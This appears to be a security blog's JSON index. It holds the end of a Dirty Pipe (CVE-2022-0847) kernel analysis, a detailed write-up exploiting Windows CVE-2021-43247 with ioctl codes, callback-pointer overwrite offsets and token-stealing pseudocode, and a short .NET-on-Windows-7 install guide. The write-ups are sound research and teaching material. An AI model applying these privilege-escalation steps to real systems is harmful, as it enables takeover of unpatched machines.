root!\\n\u0026#39;[...]b\u0026#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; and this is the state of the pipe after splicing\nstruct pipe_inode_info at 0xffff8881044aec00 \u0026gt; \u0026#39;head\u0026#39;: 2 \u0026gt; \u0026#39;tail\u0026#39;: 1 \u0026gt; \u0026#39;ring_size\u0026#39;: 1 \u0026gt; \u0026#39;bufs\u0026#39;: 0xffff888101f8a180 struct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: 0xffffea0004156880 \u0026lt;- same page as before \u0026gt; \u0026#39;offset\u0026#39;: 0 \u0026gt; \u0026#39;len\u0026#39;: 5 \u0026gt; \u0026#39;ops\u0026#39;: 0xffffffff8221cee0 \u0026lt;page_cache_pipe_buf_ops\u0026gt; \u0026gt; \u0026#39;flags\u0026#39;: PIPE_BUF_FLAG_CAN_MERGE \u0026lt;- flag still set... oopsie :) The data pointer in the struct address_space (which represents the page cache\u0026rsquo;s view on the target_file) and the pipe_buffer at head are equal, while the offset and length reflect what our PoC specified in its call to splice. Note that we are reusing the buffer we emptied earlier, re-initializing all fields but the flags.\nWhat\u0026rsquo;s the Actual Problem? At this point the problem becomes evident. With anonymous pipe buffers it is allowed to continue the writing where the previous write stopped, which is indicated by the PIPE_BUF_FLAG_CAN_MERGE flag. With the file-backed buffers, created by splicing, this should not be allowed by the kernel since those pages are \u0026ldquo;owned\u0026rdquo; by the page cache and not by the pipe.\nThus, when we splice() the data from a file into a pipe we would have to set buf-\u0026gt;flags = 0 to indicate that it is not okay to append data to an already existing - not fully written - page (buf-\u0026gt;page) since this page belongs to the page cache (the file). When we pipe_write() (or in our program just write()) again we write into the page cache\u0026rsquo;s page because the check buf-\u0026gt;flags \u0026amp; PIPE_BUF_FLAG_CAN_MERGE is true (see pipe_write above if you forgot about that part).\nSo the main problem is that we start with an anonymous pipe that will then be \u0026ldquo;turned into\u0026rdquo; a file-backed pipe (not the whole pipe but some buffers) by the splice() but the pipe does not get this information since buf-\u0026gt;flags is not set to 0 and thus the merging is still allowed.\nThe patch is simply adding the missing initialization.\ndiff --git a/lib/iov_iter.c b/lib/iov_iter.c index b0e0acdf96c15e..6dd5330f7a9957 100644 --- a/lib/iov_iter.c +++ b/lib/iov_iter.c @@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by return 0; buf-\u0026gt;ops = \u0026amp;page_cache_pipe_buf_ops; + buf-\u0026gt;flags = 0; get_page(page); buf-\u0026gt;page = page; buf-\u0026gt;offset = offset; As we can see above, our PoC arranged for the PIPE_BUF_FLAG_CAN_MERGE flag to be set on the pipe buffer re-used for the splice. Thus, the last write will trigger the bug.\npause_for_inspection(\u0026#34;About to write() into page cache\u0026#34;); if (write(pipefds[1], \u0026#34;pwned by user\u0026#34;, 13) != 13) { exit(1); } ⬀ go to source code Back in the debugger, we can see that the final invocation of pipe_write() appends to the partially filled pipe_buffer that is backed by the page cache.\nstruct address_space at 0xffff8881017d9460 \u0026gt; \u0026#39;a_ops\u0026#39;: 0xffffffff82226ce0 \u0026lt;ext4_aops\u0026gt; \u0026gt; \u0026#39;i_pages.xa_head\u0026#39; : 0xffffea0004156880 struct pipe_inode_info at 0xffff8881044aec00 \u0026gt; \u0026#39;head\u0026#39;: 2 \u0026gt; \u0026#39;tail\u0026#39;: 1 \u0026gt; \u0026#39;ring_size\u0026#39;: 1 \u0026gt; \u0026#39;bufs\u0026#39;: 0xffff888101f8a180 struct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: 0xffffea0004156880 \u0026gt; \u0026#39;offset\u0026#39;: 0 \u0026gt; \u0026#39;len\u0026#39;: 18 \u0026gt; \u0026#39;ops\u0026#39;: 0xffffffff8221cee0 \u0026lt;page_cache_pipe_buf_ops\u0026gt; \u0026gt; \u0026#39;flags\u0026#39;: PIPE_BUF_FLAG_CAN_MERGE struct page at 0xffffea0004156880 \u0026gt; virtual: 0xffff8881055a2000 \u0026gt; data: b\u0026#39;File pwned by user!\\n\u0026#39;[...]b\u0026#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; Here we can see that owned by root (starting at index 5 of \u0026ldquo;File owned by root!\u0026rdquo;) has been overwritten with pwned by user in the page cache.\nIn the shell we can confirm that the file contents changed for all processes on the system\nuser@lkd-debian-qemu:~$ ./poc user@lkd-debian-qemu:~$ cat target_file File pwned by user! user@lkd-debian-qemu:~$ exit root@lkd-debian-qemu:~# echo 1 \u0026gt; /proc/sys/vm/drop_caches [ 232.397273] bash (203): drop_caches: 1 root@lkd-debian-qemu:~# su user user@lkd-debian-qemu:~$ cat target_file File owned by root You can also see that the changes to the file\u0026rsquo;s page cache data are not written back to disk. After clearing the page cache, the old content appears again. But, all other programs would use the modified version from the page cache since the kernel transparently offers you the cached version of the file data (that\u0026rsquo;s the purpose of the page cache).\nLimitations There are some inherent limitations to the writes that we can perform using this technique that are due to implementation of the pipe and page cache that Max Kellermann mentions:\nthe attacker must have read permissions (because it needs to splice() a page into a pipe)\nthe offset must not be on a page boundary (because at least one byte of that page must have been spliced into the pipe)\nthe write cannot cross a page boundary (because a new anonymous buffer would be created for the rest)\nthe file cannot be resized (because the pipe has its own page fill management and does not tell the page cache how much data has been appended)\nApproaches to Understand the Bug Top Down vs. Bottom Up vs. Hybrid Given a PoC and a patch there are different approaches to investigate the vulnerability.\nTop Down: find the splice(), write(), read() system call implementation and go deeper.\nBottom Up: have a look at the fix: https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903 diff --git a/lib/iov_iter.c b/lib/iov_iter.c index b0e0acdf96c15e..6dd5330f7a9957 100644 --- a/lib/iov_iter.c +++ b/lib/iov_iter.c @@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by return 0; buf-\u0026gt;ops = \u0026amp;page_cache_pipe_buf_ops; + buf-\u0026gt;flags = 0; get_page(page); buf-\u0026gt;page = page; buf-\u0026gt;offset = offset; @@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size, break; buf-\u0026gt;ops = \u0026amp;default_pipe_buf_ops; + buf-\u0026gt;flags = 0; buf-\u0026gt;page = page; buf-\u0026gt;offset = 0; buf-\u0026gt;len = min_t(ssize_t, left, PAGE_SIZE); find lib/iov_iter.c (more concrete the functions copy_page_to_iter_pipe() and push_pipe()) and your way back to the system calls. Hybrid: start from splice() system call but know where we will end (either of the patched functions from above)\nLinux Kernel Source Access to the source code:\nhttps://github.com/torvalds/linux + ctags + cscope (make cscope tags) or an IDE that is capable of creating cross references (might be very resource hungry because of the kernel\u0026rsquo;s size!) https://elixir.bootlin.com/linux/v5.17.9/source (cross references already created + no need for extra tools) When reading kernel source code for the first time, you might encounter some obstacles. In general it is easy to get lost and thus you should always keep in mind what it is that you are interested in finding / understanding. We must also understand that it is impossible to understand every line of the code that we look at. Use a best-effort approach to understand the things that get you closer to you goal). You will encounter:\nlots of error checking: in general very interesting, however, here we ignore it (i.e. return -EXYZ code paths) many layers of macros, (inlined) function calls and definitions: collect everything and simplify it. Note: you cannot set breakpoints on macros, which might be a problem as well. structures full of function pointers: for example, look under \u0026ldquo;Referenced in [\u0026hellip;] files\u0026rdquo; on https://elixir.bootlin.com \u0026ldquo;decide\u0026rdquo; for some implementation (in our case ext2 file system) conditional compilation depending on: compile time options: check the config files you used for your build .config processor architecture: go for x86-64 if present, else take the generic version Conclusion A detailed and streamlined analysis of any bug makes it seem shallow, however, don\u0026rsquo;t get fooled by that impression. Making sense of the bug requires a conceptual understanding of multiple interacting subsystems of the Linux kernel. A root cause analysis without a PoC, blog post, or patch at hand would be a tricky task. In general, the nature of this bug makes it a great opportunity to learn about the Linux kernel. A missing initialization is a welcome diversion from the ubiquitous memory corruption issues (that a lot of exploit developers love ;)). Furthermore, in contrast to those kind of vulnerabilities, the exploitation of this one is almost trivial, stable, and it works across a huge range of Linux distributions. Maybe you got motivated to check out some more complex vulnerabilities / exploits or the Linux kernel yourself :).\n","permalink":"https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/","tags":["Linux","kernel","LPE","pipe","splice","page cache","debugging"],"title":"Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847)"},{"categories":null,"content":"In this blog post I will go in depth into the inner workings of CVE-2021-43247 , which was fixed on the 14th of December 2021. This bug was classified as \u0026ldquo;Windows TCP/IP Driver Elevation of Privilege Vulnerability\u0026rdquo;. The vulnerability itself was probably dormant for a long time, but became exploitable when the AF_UNIX address family was first introduced in 2019.\nI will also take this as an excuse to explain in detail, what drivers are, how user space communicates with drivers, what a Local Privilege Escalation (LPE) is and what how we can achieve it in this case.\nThe goal / what is an LPE (Local Privilege Escalation) A Local Privilege Escalation (sometimes also called Elevation of Privilege or EoP) is an exploit which obtains some privilege that it is not supposed to be able to get. In the traditional cases (as in this one) this means we start out with at normal user shell and end up with administrator access. On Linux this would be about obtaining a root shell. This is usually done through a bug in a privileged process, a bug in a driver or a bug in the operating system itself.\nAs the CVE description tells us, we are dealing with a bug in the TCP/IP driver.\nWhat are drivers and how does user space communicate with them? Drivers are simply PE files , which the kernel loads into the kernel address space. PE (Portable Executable) is the executable file format used by Windows, it\u0026rsquo;s used by \u0026ldquo;.exe\u0026rdquo; and \u0026ldquo;.dll\u0026rdquo; files. Drivers usually have the file extension \u0026ldquo;.sys\u0026rdquo;, but there are also library drivers which also get the \u0026ldquo;.dll\u0026rdquo; file extension. Most drivers are contained in the \u0026ldquo;C:\\windows\\system32\\drivers\u0026rdquo; directory. What drivers are loaded on system startup is determined by the registry and the physical devices available to the system.\nUser space can communicate with the loaded drivers using kernel system calls (or syscalls for short). For example, consider the program\n// blog_socket.c - small example program used in this blog #include \u0026lt;winsock.h\u0026gt; int main() { // Initialize WinSock WSAStartup(MAKEWORD(2, 2), \u0026amp;(WSADATA){0}); // Create a TCP/IPv4 socket. SOCKET Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // Bind the socket to any address bind(Socket, \u0026amp;(struct sockaddr){AF_INET}, sizeof(struct sockaddr)); } Then we can observe the following call stack:\n00 ntdll!NtCreateFile 01 mswsock!SockSocket+0x56e 02 mswsock!WSPSocket+0x23a 03 WS2_32!WSASocketW+0x130 04 WS2_32!socket+0x6e 05 blog_socket!main+0x84 ntdll!NtCreateFile is the function that actually transitions into the kernel address space. The assembly for all ntdll!NtXxx functions looks something like the following:\nNtCreateFile: mov r10, rcx ; load the first argument into r10, as the syscall ; instruction uses rcx as the return location mov eax, 0x55 ; load the syscall value into eax (0x55 is \u0026#39;NtCreateFile\u0026#39;) test byte ptr [.Running32Bit], 1 ; check if we are running a 32bit executable jnz .Syscallx86 ; syscall transitions into the kernel. systcall ret .Syscallx86: ; x86 does not have a syscall instruction, use int 0x2e instead of syscall. int 0x2e ret We will only focus on the x64 case here. The syscall instruction loads the new instruction pointer from a specialized hardware registers (called a model specific register or MSR). Namely, the MSR IA32_LSTAR. It also stores the return address (in this case the address of the ret instruction) into rcx and sets the privilege level of the processor to 0. This is why kernel mode is sometimes referred to as ring 0.\nWhen the processor is running at privilege level 0, it can access kernel space memory. Here it is important to know that the address space does not change, but at non-zero privilege level the processor faults when it is accessing a page which does not have the USER bit set in the page table.\nIn Windows 10 the IA32_LSTAR MSR points to the function nt!KiSystemCall64, which first establishes a stack pointer:\nKiSystemCall64: swapgs ; load saved kernel thread locals from some MSR mov gs:[gs.user_stack], rsp ; save user stack, in the kernel thread locals mov rsp, gs:[gs.kernel_stack] ; load kernel space stack, from the thread locals ; ... from here we are just in kernel space, and can do whatever we want ; e.g. Save all the registers and then call the according NtXxx ; kernel function depending on eax. The kernel then figures out what kernel function was requested by looking at eax and transitions to it. In this case we end up in nt!NtCreateFile (on the kernel side).\n00 nt!NtCreateFile \u0026lt;-- Kernel space function 01 nt!KiSystemServiceCopyEnd+0x25 02 ntdll!NtCreateFile+0x14 \u0026lt;-- User space function 03 mswsock!SockSocket+0x4ec 04 mswsock!WSPSocket+0x233 05 WS2_32!WSASocketW+0x1be 06 WS2_32!socket+0x9b Note that the address space is still the same, as in user space. The difference being that we are now allowed to access kernel memory. The arguments to nt!NtCreateFile are unchanged from the arguments ntdll!NtCreateFile received. The kernel very carefully validates all arguments and copies them safely to kernel space memory.\nIn this case \u0026ldquo;mswsock.dll\u0026rdquo; tries to open a HANDLE to AFD or the \u0026ldquo;Ancillary Function Driver for WinSock\u0026rdquo;.\nAFD AFD is located at \u0026ldquo;C:\\windows\\system32\\drivers\\afd.sys\u0026rdquo; and provides implementations for the usual socket functions.\nAs I have hopefully been able to convince you the socket function corresponds to opening a HANDLE to AFD using NtCreateFile. Using the HANDLE returned by NtCreateFile, communication occurs via the NtDeviceIoControlFile:\n__kernel_entry NTSTATUS NtDeviceIoControlFile( [in] HANDLE FileHandle, [in] HANDLE Event, [in] PIO_APC_ROUTINE ApcRoutine, [in] PVOID ApcContext, [out] PIO_STATUS_BLOCK IoStatusBlock, [in] ULONG IoControlCode, [in] PVOID InputBuffer, [in] ULONG InputBufferLength, [out] PVOID OutputBuffer, [in] ULONG OutputBufferLength ); Here, each different socket function corresponds to an IoControlCode or ioctl for short. For example, if we bind the socket we end up in afd!AfdBind\n00 afd!AfdBind 01 afd!AfdDispatchDeviceControl+0x7d 02 nt!IofCallDriver+0x59 03 nt!IopSynchronousServiceTail+0x1b1 04 nt!IopXxxControlFile+0xe0c 05 nt!NtDeviceIoControlFile+0x56 06 nt!KiSystemServiceCopyEnd+0x25 07 ntdll!NtDeviceIoControlFile+0x14 08 mswsock!WSPBind+0x278 09 WS2_32!bind+0xdf 0a blog_socket!main+0x137 Similarly, recv corresponds to AfdReceive, send corresponds to AfdSend and so on. The arguments and return values of these functions are serialized into the InputBuffer and OutputBuffer, respectively.\nThe Bug The bug combines three different features that Windows 10 provides. The TCP_FASTOPEN option, the ConnectEx/AfdSuperConnect function and the AF_UNIX address family.\nTCP_FASTOPEN Taken from Wikipedia , the TCP_FASTOPEN option allows the client under certain conditions to start sending data to the host without waiting for the ACK packet. For us, what it does is not important, only that it is necessary to call AfdSuperConnect later on.\nAF_UNIX As mentioned by this blog, the vulnerability probably turned exploitable when Windows started supporting sockets of type AF_UNIX.AF_UNIX sockets provide a means of inter-process communication. For us the important fact is that the associated sockaddr looks like this:\n#define UNIX_PATH_MAX 108 typedef struct sockaddr_un { ADDRESS_FAMILY sun_family; /* AF_UNIX */ char sun_path[UNIX_PATH_MAX]; /* pathname */ } SOCKADDR_UN, *PSOCKADDR_UN; And therefore, with a size of 110 = 0x6e is quite large.\nConnectEx The ConnectEx function is a Microsoft specific extension , which can be queried using WSAIoctl. The underlying kernel function is AfdSuperConnect. Sadly, the user space API validates the arguments to ConnectEx and therefore we are forced to call it using NtDeviceIoControlFile directly. The socket functions do not expose the underlying handles to AFD. This forces us to use NtCreateFile and NtDeviceIoControlFile directly for all communication with AFD.\nAfdSuperConnect gets invoked when using NtDeviceIoControlFile with the ioctl 0x120c7. The input buffer for this call consists of 10 bytes, most of which seem to be unused and then any sockaddr. The vulnerability occurs when AfdSuperConnect attempts to connect to a sockaddr of type AF_UNIX.\nThe Setup Create an AF_INET socket using NtCreateFile. Enable the TCP_FASTOPEN option using AfdTliIoControl (NtDeviceIoControlFile with ioctl 0x120bf). Bind the socket to any address using ioctl AfdBind (NtDeviceIoControlFile with ioctl 0x12003). Trigger the vulnerability by using AfdSuperConnect (NtDeviceIoControlFile with ioctl 0x120c7) passing a sockaddr of type AF_UNIX. As we opened the socket as an AF_INET socket, the call to AfdSuperConnect ends up in tcpip!TcpTlProviderConnectAndSend.\n00 tcpip!TcpTlProviderConnectAndSend 01 afd!AfdSuperConnect+0x10b26 02 afd!AfdDispatchDeviceControl+0x7d 03 nt!IofCallDriver+0x59 04 nt!IopSynchronousServiceTail+0x1b1 05 nt!IopXxxControlFile+0xe0c 06 nt!NtDeviceIoControlFile+0x56 tcpip!TcpCreateConnectTcb checks early on whether the TCP_FASTOPEN option is enabled and if it is not it returns with the error code STATUS_RETRY. If it is, it allocates a big internal structure and later on copies the sockaddr we provided into the internal structure.\n// Ghidra Decompilation from (tcpip!TcpCreateConnectTcb) SockaddrFamily = *TlConnect-\u0026gt;ConnectSockaddr; if (SockaddrFamily \u0026lt; 0x23) { sockaddr_size = (\u0026amp;::sockaddr_size)[SockaddrFamily]; } /* this is where the magic happens */ memcpy(\u0026amp;_Dst-\u0026gt;contains_the_function_pointer-\u0026gt;sockaddr, TlConnect-\u0026gt;ConnectSockaddr, sockaddr_size); Crucially, as this is all happening in \u0026ldquo;tcpip.sys\u0026rdquo;, the code only expects a sockaddr of type AF_INET or AF_INET6 which are of size 0x1c and 0x24, respectively. Hence, tcpip only reserves 0x24 bytes of memory for said sockaddr and we can overwrite 0x6e - 0x24 bytes after the size reserved for the sockaddr. Fortunately for us, this range of bytes contains a callback function pointer (originally pointing to afd!AfdTLBufferedSendComplete) and its callback context argument.\nPrior to the vulnerable memcpy:\nkd\u0026gt; dq rax + f8 L2 ffffac8e`6702a138 fffff806`2d0db540 ffffac8e`6841c9e0 kd\u0026gt; ln fffff806`2d0db540 (fffff806`2d0db540) afd!AfdTLBufferedSendComplete After the vulnerable memcpy:\nkd\u0026gt; dq ffffac8e`6702a138 L2 ffffac8e`6702a138 13371337`13371337 deaddead`deaddead The call to tcpip!TcpTlProviderConnectAndSend eventually fails, returning a status code of STATUS_INVALID_ADDRESS_COMPONENT, but not before trying to \u0026ldquo;complete\u0026rdquo; the request, by calling the callback function pointer, passing its callback context as the first argument.\nBreakpoint 3 hit tcpip!guard_dispatch_icall_nop: fffff803`11e36490 ffe0 jmp rax kd\u0026gt; r rax, rcx rax=1337133713371337 rcx=deaddeaddeaddead kd\u0026gt; k # Child-SP RetAddr Call Site 00 ffffeb0f`32dc18e8 fffff803`11d767fd tcpip!guard_dispatch_icall_nop 01 ffffeb0f`32dc18f0 fffff803`11d73840 tcpip!TcpCreateAndConnectTcbComplete+0xc39 02 ffffeb0f`32dc1b30 fffff803`11d88e2a tcpip!TcpShutdownTcb+0x1040 03 ffffeb0f`32dc1f20 fffff803`11d88d38 tcpip!TcpCreateAndConnectTcbInspectConnectComplete+0xba 04 ffffeb0f`32dc2000 fffff803`11d87be8 tcpip!TcpContinueCreateAndConnect+0x1044 05 ffffeb0f`32dc2220 fffff803`11d87998 tcpip!TcpCreateAndConnectTcbInspectConnectRequestComplete+0x118 06 ffffeb0f`32dc2330 fffff803`11d8709d tcpip!TcpCreateAndConnectTcbWorkQueueRoutine+0x8a8 07 ffffeb0f`32dc2450 fffff803`11ea2247 tcpip!TcpCreateAndConnectTcb+0xcb5 08 ffffeb0f`32dc25d0 fffff803`11995606 tcpip!TcpTlProviderConnectAndSend+0x17 09 ffffeb0f`32dc2600 fffff803`1198958d afd!AfdSuperConnect+0x10b26 Exploitability, Mitigations and Complications As we have seen, the vulnerability gives us full control of the instruction pointer rip and the first argument rcx, and does so by calling into a function pointer we can freely choose. A vulnerability this good is almost always exploitable. But we first have to jump through some loops\u0026hellip;\nSMEP (Supervisor Mode Execution Prevention) The simplest idea to exploit a bug of this kind would be to set the instruction pointer to a user space address, i.e write some shellcode that when executed in kernel mode will elevate permissions of the current process. Sadly, Intel thought of this long ago and introduced SMEP. SMEP uses the fact that user-pages have the USER flag set in the page tables to throw an exception when the kernel executes any user address.\nASLR (Address Space Layout Randomization) Okay, so just executing user space code is out of the question, but what if we first load our shellcode into the kernel? First of, though it sounds hard, it is actually really easy to allocate arbitrary rwx-memory into kernel space using pipes:\nchar rwx_memory [0x100] = { \u0026lt;my_shellcode\u0026gt; }; // cannot contain zeroes HANDLE read_pipe; HANDLE write_pipe; CreatePipe (\u0026amp;read_pipe, \u0026amp;write_pipe, NULL, NULL); // ends up in \u0026#39;NpSetAttribute\u0026#39; NtFsControlFile(write_pipe, NULL, NULL, NULL, \u0026amp;status, 0x11003C, rwx_memory, sizeof(rwx_memory), output, sizeof(output)); But as far as I know, there is no way for us to know where this allocation will end up (without another exploit or administrator privileges which would defeat the purpose). Even if we could control the heap perfectly we do not know where the heap starts. This is because of ASLR (Address Space Layout Randomization). At system startup, Windows randomizes all addresses it will use during runtime.\nSo\u0026hellip;? Can we somehow get or leak addresses (or pointers) from the kernel? Fortunately, Windows is very nice to us in this respect. There is a user space function called NtQuerySystemInformation, which can be used to retrieve a lot of different kinds of information depending on an InformationClass. The InformationClass we are interested in is SystemModuleInformation. Using it, we can obtain the loaded base address of every currently running driver on the system, including the kernel (ntoskrnl.exe) itself.\nBy parsing the images contained on disk and using these base addresses, we know the address of every exported kernel function. One could go one step further and look at all symbols using the public symbols (.pdb) provided by Microsoft, but for our purposes restricting the search to exported functions was enough.\nCFG (Control Flow Guards) Okay, the plan is to call exported kernel functions, but there (potentially) is one more obstacle in our way the CFG (Control Flow Guard) mitigation. I did not emphasize this above, but looking at the call stack to the vulnerable call we can see that we are inside of a function called guard_dispatch_icall_nop. This means that control flow guards are disabled. If they were enabled we would instead be inside nt!guard_dispatch_icall. nt!guard_dispatch_icall checks whether the address we are jumping to is registered as a CFG target. If the target is not registered, nt!guard_dispatch_icall crashes the system (mitigating the exploit). This registration happens when the driver is loaded. The binary contains information on which functions are valid CFG targets.\nYou can also view the CFG information using dumpbin:\n\u0026gt; dumpbin /loadconfig C:\\windows\\system32\\ntoskrnl.exe Microsoft (R) COFF/PE Dumper Version 14.28.29336.0 Copyright (C) Microsoft Corporation. All rights reserved. Dump of file C:\\windows\\system32\\ntoskrnl.exe File Type: EXECUTABLE IMAGE Section contains the following load config: \u0026lt;...\u0026gt; Guard CF Function Table Address -------- 0000000140200010 E 0000000140200050 00000001402000B0 00000001402001A0 E 0000000140200580 E 0000000140200940 E 00000001402009F0 0000000140200C40 00000001402010B0 00000001402010E0 0000000140201200 E 0000000140201750 E 0000000140201770 . . . Therefore, if the exploit is supposed to work even if CFG is enabled, we need to chose our target function as a valid CFG target.\nIRQL (Interrupt Request Level) One last detail that bears mentioning, is the Interrupt Request Level (IRQL). The interrupt Request level is a hardware feature that allows threads to specify what interrupts they are willing to accept. Importantly, if the IRQL is at \u0026gt;= 2 the thread is not allowed to page-fault anymore. This means that when the IRQL is at least two, the thread cannot access pageable memory anymore.\nPageable memory is memory that the Windows kernel reserves the right to spill to disk, if the system is running low on memory. If a thread would then access that memory a pagefault would occur and the Windows kernel would reload the page from disk.\nWhy is all this important? Well, it just so happens that the function we are overwriting is a \u0026ldquo;Completion Routine\u0026rdquo;. Completion Routines are supposed to run at IRQL = 2 and therefore might crash the system whenever they are accessing paged memory. All user space memory is paged and thus the exploit might crash when accessing user space memory. Further, not all kernel space functions are non-paged (though most are), further restricting the set of functions we can use in the exploit.\nIn reality, we are only interested in providing a proof of concept, so one could just ignore the the fact that the exploit crashes sometimes, but we actually have a solution:\nSometimes, when the kernel uses a piece of user space memory, it uses so called Memory Descriptor Lists (MDL) . When such a list is \u0026ldquo;locked\u0026rdquo;, the kernel will never page out the memory. Therefore, we just have to make some request, that will \u0026ldquo;lock\u0026rdquo; an MDL for the user space memory we are using and then we can reliably use it at IRQL = 2.\nPrimitives So, we have control over rip and rcx and can call some exported kernel functions, but what is the plan? Roughly, we want to obtain exploit primitives which allow us to read and write kernel memory:\nu64 read_u64(u64 kernel_address); void write_u64(u64 kernel_address, u64 value); These will later be used to give our process administrator privileges using a generalized exploit algorithm.\nWe construct these primitives by using the vulnerability with an exported kernel function. The perfect kernel function for a read primitive would look something like this:\nvoid read_function(struct read_argument *read){ read-\u0026gt;value = read-\u0026gt;pointer-\u0026gt;value; } And the perfect write function would look something like this:\nvoid write_function(struct write_argument *write){ *write-\u0026gt;pointer = write-\u0026gt;value; } Here the read/write argument would be a pointer to user space memory. This means we have full control of the value of read-\u0026gt;pointer and write-\u0026gt;pointer, respectively. These pointers then get dereferenced and either written to the controlled write-\u0026gt;value or read and stored back into user space memory.\nIf one cannot find primitives as perfect as these, one can search for functions that spread the first argument. The perfect spread function would be something like:\nvoid spread_function(struct arguments *arguments){ (*arguments-\u0026gt;function)(arguments-\u0026gt;argument_1, arguments-\u0026gt;argument_2, arguments-\u0026gt;argument_3, arguments-\u0026gt;argument_4); } Using the perfect spread function one could obtain a read/write function as follows:\nvoid read_write_function_called_by_spread_function( struct argument_1 *arg_1, struct argument_2 *arg_2){ arg_1-\u0026gt;value = arg_2-\u0026gt;value; } In practice, we used two spread functions and then different read and write functions.\nWindows Exploitation tricks and the general exploit algorithm The exploitation algorithm we are using is called \u0026ldquo;Token Stealing\u0026rdquo;. You can find a lot of information on it online. But we will give a short overview.\nEvery process has an internal _EPROCESS kernel structure. The access rights of the process are contained in an internal kernel structure called _TOKEN. The _EPROCESS structure references this token, by pointer.\nkd\u0026gt; dt nt!_EPROCESS Token +0x358 Token : _EX_FAST_REF kd\u0026gt; nt!_EX_FAST_REF +0x000 Object : Ptr64 Void +0x000 RefCnt : Pos 0, 4 Bits +0x000 Value : Uint8B Now, if we control the _TOKEN, we have control of all access rights. One option would be to use the read and write primitive to directly alter the access token, but in this case there is a simpler way. If we can locate a process which has SYSTEM access rights, we can simply copy the _TOKEN-pointer of the SYSTEM process into the _EPROCESS-\u0026gt;Token of our process. And it just so happens that the kernel exports a pointer to the nt!PsInitialSystemProcess which has SYSTEM access rights.\nTherefore, the basic algorithm would be\nUse the read primitive to read the value of (nt!PsInitialSystemProcess)-\u0026gt;Token Use the write primitive to write the value to our _EPROCESS-\u0026gt;Token field. But 2 problems remain:\nAs the _EPROCESS structure is undocumented and subject to change, the offset of the Token field varies by kernel version. We do not know where our _EPROCESS structure is. This is where Windows is really helpful again. Just as we can find all base addresses of kernel modules using NtQuerySystemInformation(SystemModuleInformation), we can find the address of both our _EPROCESS structure (solving 2) and our _TOKEN structure using NtQuerySystemInformation(SystemHandleInformation). Now, using the read primitive, we can iterate through our _EPROCESS structure and locate the _TOKEN structure. This then gives us the offset of the Token field.\nPutting it all together in pseudo-code, it looks something like this:\n// Use the Windows API to get all the information we want. token, process := find_token_and_process_using_NtQuerySystemInformation(); PsInitialSystemProcess_export, read_function, write_function := find_exported_symbols_using_NtQuerySystemInformation(); // Use a system call that is more or less equivalent to // `socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)` socket_handle := NtCreateFile(\u0026#34;\\\\Device\\\\Afd\u0026#34;, EaBuffer = {AF_INET, SOCK_STREAM, IPPROTO_TCP}); // use the system call that is equivalent to // `setsockopt(socket, IPPROTO_TCP, TCP_FASTOPEN, \u0026amp;(u32){1}, 1)` NtDeviceIoControlFile(socket_handle, 0x120bf, .input_buffer = {SetSockOpt, .level = IPPROTO_TCP, .option = TCP_FASTOPEN, .optval = \u0026amp;(u32){1}, .optlen = 1}); // use the system call that is equivalent to // `bind(socket, \u0026amp;(struct sockaddr){AF_INET}, sizeof(struct sockaddr))` NtDeviceIoControlFile(socket_handle, 0x12003, ...); // The read and write primitives now work by triggering the vulnerability by calling // `AfdSuperConnect` through the `NtDeviceIoControlFile`. function u64 read_u64(u64 address): read_argument := {.pointer = address}; NtDeviceIoControlFile(socket_handle, 0x120c7, .input_buffer = {.sockaddr = {AF_INET, .offset_0x5c = read_function, .offset_0x64 = \u0026amp;read_argument}}); return read_argument.value; function void write_u64(u64 address, u64 value): write_argument := {.pointer = address, .value = value}; NtDeviceIoControlFile(socket_handle, 0x120c7, .input_buffer = {.sockaddr = {AF_INET, .offset_0x5c = write_function, .offset_0x64 = \u0026amp;write_argument}}); // figure out the token_offset, by linearly scanning through our `_EPROCESS` for i from 0 to 0x1000: maybe_token := read_u64(process + i * 8); if maybe_token == token: token_offset = i * 8; break; // figure out the `_TOKEN` of `nt!PsInitialSystemProcess` PsInitialSystemProcess = read_u64(PsInitialSystemProcess_export); PsInitialSystemProcessToken = read_u64(PsInitialSystemProcess + token_offset); // actually steal the access `_TOKEN` to give us complete access rights. write_u64(token + token_offset, PsInitialSystemProcessToken); // spawn a shell to keep the access rights in a clean way. spawn_shell(); ","permalink":"https://lolcads.github.io/posts/2022/06/exploiting_cve_2021_43247/","tags":["Windows","kernel","LPE"],"title":"Exploiting CVE-2021-43247"},{"categories":null,"content":"Installing new .NET versions on a Windows 7 VM In this post, I will explain how to install .NET Framework 4.8 on a Windows 7 VM.\nMotivation Virtual Machines running Microsoft Windows are frequently used for dynamic analysis of Windows executables. Windows 7 is still used for analysis VM, although it is no longer supported by Microsoft and ships with an outdated .NET version. If a sample requires a .NET version which is not present on the analysis VM, the execution fails and the file cannot be analysed. For this reason it might be required to install a recent .NET version on a Windows 7 VM.\nProblem The .NET Framework 4.8 installer tries to verify the integritiy of the installation data prior to the installation. However, the root certificates required for this verification process are not present on Windows 7. This issue cannot be fixed via Windows updates, as they are not available for Windows 7 anymore.\nSolution First, download the offline installer for .NET Framework 4.8 Execute the file. This will extract the installation data into a temporary subfolder of C:\\ with a random name. Wait until the extraction process has finished and an installer opens. You don\u0026rsquo;t have to interact with this installer window at all. Just leave it opened to prevent the deletion of the temporary subfolder. Next, navigate to the temporary folder and execute the file netfx_Full_x64.msi or netfx_Full_x86.msi. This will trigger the installation of .NET Framework 4.8. Restart the system after the installation finished. That\u0026rsquo;s it, you\u0026rsquo;re all set! :)\n","permalink":"https://lolcads.github.io/posts/2022/03/win7_dotnet_install/","tags":["Win7",".NET","dynamic analysis"],"title":"Installing new .NET versions on a Windows 7 VM"},{"categories":null,"content":"Fuzzing Network Applications with AFL and 